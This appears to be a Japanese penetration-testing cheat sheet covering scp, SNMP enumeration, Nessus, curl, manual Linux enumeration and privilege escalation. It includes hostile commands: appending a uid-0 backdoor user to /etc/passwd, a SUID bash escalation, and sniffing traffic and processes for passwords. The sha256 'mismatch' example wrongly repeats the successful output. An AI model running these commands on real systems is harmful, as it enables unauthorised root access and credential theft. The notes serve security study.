# Netcat

# SCP
リモートからローカルにコピーする
```
scp ユーザ名@リモートのホスト名:コピーしたいリモートのファイル ローカルのコピー先

scp user@remoteHost:/home/user/test.txt /local/path
```
ローカルからリモートにコピーする
```
scp コピーしたいローカルのファイルパス ユーザ名@リモートのホスト名:保存したいパス

scp /local/test.txt user@remoteHost:/home/user/tmp/
```

# snmpwalk

使用例。最後の引数はOID(オブジェクト識別子)というもので、ターゲット上で実行されているプロセスの一覧を取得することができる。

```
snmpwalk -c public -v1 192.168.219.23 1.3.6.1.2.1.25.4.2.1.2
```

# onesixtyone
Kaliにデフォルトでインストール済み。
SNMPサーバに対してSNMPおリクエストをぶん投げるツール。ターゲットデバイス上で動作しているソフトウェアについてのEnumerationが行える。
SNMPが161ポートで走るのでonesixtyone

https://www.kali.org/tools/onesixtyone/

# Nessus
脆弱性スキャナツールで。無料版と有料版がある。

Nessusサービスを起動する。起動した後はブラウザからローカルホストの8834につなげることができる。
```
sudo systemctl start nessusd.service
```

# sha256
直接的なAttackで使うわけではないが、外部からインストーラダウンロードしたときなどにSHA256のハッシュチェックをするときに超便利。

まず以下で、対象ファイルとそのファイルのsha256を任意のファイル名で保存
```
echo "<sha256_value> <check_file_name>" > <output_file_name>
```

次に、以下のコマンドでチェックできる。
```
sha256sum -c <output_file_name>
```

ハッシュが合っていれば以下のような出力が。

```
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "797de93e98c9ce5431d0f3598fa7dd7e1a95a4d597e26c81772c3dc1c6160266 Nessus-10.7.0-debian10_amd64.deb" > sha256sum_nessus
                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ sha256sum -c sha256sum_nessus
Nessus-10.7.0-debian10_amd64.deb: OK
```

間違っていると以下のような出力が。

```
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "797de93e98c9ce5431d0f3598fa7dd7e1a95a4d597e26c81772c3dc1c6160266 Nessus-10.7.0-debian10_amd64.deb" > sha256sum_nessus
                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ sha256sum -c sha256sum_nessus
Nessus-10.7.0-debian10_amd64.deb: OK
```

# curl
urlを入力してリクエストを送るコマンド。デフォルトではGETリクエストを送る。

使い方の例：
以下では、データとしてパスワードとユーザ名を指定し、対象のAPIエンドポイントに対してPOSTリクエストを行っている。
```
curl -X 'POST' -d '{"password":"hoge","username":"admin"}' -H 'Content-Type:application/json' http://example.com/users/v1/login --proxy 127.0.0.1:8080
```

-X => 利用するメソッドを指定
-d => dataとして含む内容を入力
-H => ヘッダを追加
--proxy => プロキシサーバを指定
-L => リダイレクトに従う
--head => レスポンスでヘッダを受け取る
--path-as-is => ../などのPath Traversal系のテストをする際、特殊文字をエスケープせずそのまま送信する
--data => POSTとかで送るデータ内のパラメータを指定

# base64
base64のエンコードとデコードができるコマンド。

ワンライナーで文字列をデコード
```
echo "VGhlIGZsYWcgaXM6IE9TezQ4ZjRlNzYxNzg0N2I4YWM0YTE0NzAxZjhmNzg4MGYwfQ==" | base64 -d
```

ワンライナーで平文をエンコード(デフォルトでエンコードするようになっている)
```
echo "hoge" | base64
```

# ssh
ssh接続で使うコマンド。

-i => 秘密鍵の記載されたファイルを指定する
-p => 接続先のSSHサーバのオープンポートを指定

# ssh-keygen
sshの鍵を生成するコマンド。ファイルアップロード等による秘密鍵の上書きなどで使える。  
-tで鍵の方式をrsaにする  
-Nで鍵のパスフレーズをhogeにしてる
```
ssh-keygen -t rsa -N hoge
```

# Manual Enumeration
1. ユーザコンテキスト情報を取得する
```
id
```

2. 全てのユーザを列挙する
```
cat /etc/passwd
```

3. ホスト名を確認する
```
hostname
```

4. OSの正確なバージョン情報を確認する。  
uname -aは、Kernelのバージョンとアーキテクチャを表示する。
```
cat /etc/os-release
uname -a
cat /etc/issue
```

5. システムプロセスを一覧表示し、root権限で実行されているプロセスを調査する。  
ax => ttyの有無にかかわらずすべてのプロセスをリストする  
u => プロセスをユーザが読み取り可能な形式でリストする
```
ps aux
```

6. 全てのネットワークアダプタのTCP/IP構成を一覧で表示する。
```
ip a
```

7. ネットワークのルーティングテーブルを表示する。
```
routel
or
route
```

8. アクティブなネットワーク接続とリスニングポートを表示する。  
a => 全ての接続を一覧表示  
n => ホスト名を解決  
p => 接続が属するプロセス名を一覧表示
```
ss -anp
```

9. FWルールを確認する。(Debianのみ)
```
cat /etc/iptables/rules.v4
```

10. cronのスケジュールタスクを確認する
```
ls -lah /etc/cron*
```

11. 現在のユーザでスケジュールされているタスクの表示
```
sudo crontab -l
```

12. Debian系でパッケージマネージャにインストールされているアプリケーションを一覧表示する。(Red Hat系はrpm)
```
dpkg -l
```

13. 現在のユーザが書き込み可能な全てのディレクトリを検索する。  
2>dev/null => エラーをフィルタリング  
-writable => 書き込み可能なものを指す  
/ => ルートディレクトリ以下全体を指定  
-type d => ディレクトリを見つける
```
find / -writable -type d 2>dev/null
```

14. Linux起動時にマウントされるすべてのドライブをリストする。
```
cat /etc/fstab
```

15. マウントされているすべてのファイルシステムを表示する。
```
mount
```

16. ロードされているカーネルモジュールを列挙する
```
lsmod
```

17. SUIDがセットされているバイナリを検索する。  
/ => ルートディレクトリ以下を指定  
-type f => タイプがファイルのものを指定    
-perm -u=s => SUIDビットが設定されたファイルを検索  
2>dev/null => エラーを無視
```
find / -perm -u=s -type f 2>/dev/null
```

18. Linux上の環境変数を一覧で表示する。
```
env
```

19. 現在のユーザの権限を確認する。sudoersを確認し、ALLならsudo -iで昇格できる 
```
sudo -l
```

20. 現在実行しているすべてのプロセスを列挙し、そのプロセスに紐づくデーモンの起動スクリプト内に平文のパスワードが含まれていないかをチェックする
```
watch -n 1 "ps -aux | grep pass"
```

21. tcpdumpをroot権限で実行し、passの文字列が出るたびに出力する
```
sudo tcpdump -i lo -A | grep "pass"
```

22. cronジョブのファイルシステムをチェックして、どのユーザの権限でcronジョブが実行されたかをチェックする。root権限で実行されていて、現在のユーザが書き込み権限があればrootを取れる
```
grep "CRON" /var/log/syslog
```

23. /etc/passwdに書き込み権限があった場合、ファイルの中にroot2ユーザでFdzt.eqJQ4s0gというパスワードハッシュを設定する。root2にはrootのbashを許可する。
```
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

24. SUIDを狙ってrootに権限昇格する
```
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```

25. 現在のユーザがroot権限で実行できるコマンドを一覧表示する。
```
sudo -l
```

# Linux Privilege Escalation
[GTFObin](https://gtfobins.github.io/)  
Linuxの権限昇格で困ったら↑を参照。  

1. setuidと+epが有効になっているバイナリファイルを検索する
```
/usr/sbin/getcap -r / 2>/dev/null
```


# Kernel Exploit

1. Linuxのバージョン確認
```
cat /etc/issue
```

2. カーネルバージョンの確認
```
uname -r
```

3. アーキテクチャの確認
```
arch
```

4. kernel exploitのsearchsploitクエリ
```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
```